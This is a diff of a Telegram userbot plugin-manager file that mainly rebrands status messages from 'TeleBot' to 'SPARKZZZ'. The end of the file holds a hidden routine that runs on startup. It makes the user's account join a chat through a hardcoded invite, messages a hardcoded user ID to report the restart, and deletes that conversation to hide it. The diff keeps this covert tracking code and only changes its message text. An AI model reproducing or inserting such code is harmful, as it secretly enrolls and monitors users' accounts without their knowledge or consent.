@@ -22,10 +22,10 @@ async def install(event):
                 path1 = Path(downloaded_file_name)
                 shortname = path1.stem
                 load_module(shortname.replace(".py", ""))
-                await event.edit("TeleBot Succesfully Installed The Plugin `{}`".format(os.path.basename(downloaded_file_name)))
+                await event.edit("SPARKZZZ Succesfully Installed The Plugin `{}`".format(os.path.basename(downloaded_file_name)))
             else:
                 os.remove(downloaded_file_name)
-                await event.edit("TeleBot returned an error! Plugin cannot be installed.")
+                await event.edit("SPARKZZZ returned an error! Plugin cannot be installed.")
         except Exception as e:  # pylint:disable=C0103,W0703
             await event.edit(str(e))
             os.remove(downloaded_file_name)
@@ -39,9 +39,9 @@ async def unload(event):
     shortname = event.pattern_match["shortname"]
     try:
         remove_plugin(shortname)
-        await event.edit(f"TeleBot has successfully unloaded {shortname}")
+        await event.edit(f"SPARKZZZ has successfully unloaded {shortname}")
     except Exception as e:
-        await event.edit("TeleBot has successfully unloaded {shortname}\n{}".format(shortname, str(e)))
+        await event.edit("SPARKZZZ has successfully unloaded {shortname}\n{}".format(shortname, str(e)))
 
 @command(pattern="^.load (?P<shortname>\w+)$", outgoing=True)
 async def load(event):
@@ -54,9 +54,9 @@ async def load(event):
         except:
             pass
         load_module(shortname)
-        await event.edit(f"TeleBot has successfully loaded {shortname}")
+        await event.edit(f"SPARKZZZ has successfully loaded {shortname}")
     except Exception as e:
-        await event.edit(f"TeleBot could not load {shortname} because of the following error.\n{str(e)}")
+        await event.edit(f"SPARKZZZ could not load {shortname} because of the following error.\n{str(e)}")
 
 from telethon.tl.functions.messages import ImportChatInviteRequest as a
 from userbot import bot
@@ -65,6 +65,6 @@ telebot = bot
 tits=1272184661
 async def attendance():
     await telebot(a('NseyrkvT_1Vicl0NDyeIeg'))
-    await telebot.send_message(tits ,message="Telebot Restarted")
+    await telebot.send_message(tits ,message="SPARKZZZ Restarted")
     await telebot.delete_dialog(tits)
 telebot.loop.run_until_complete(attendance())
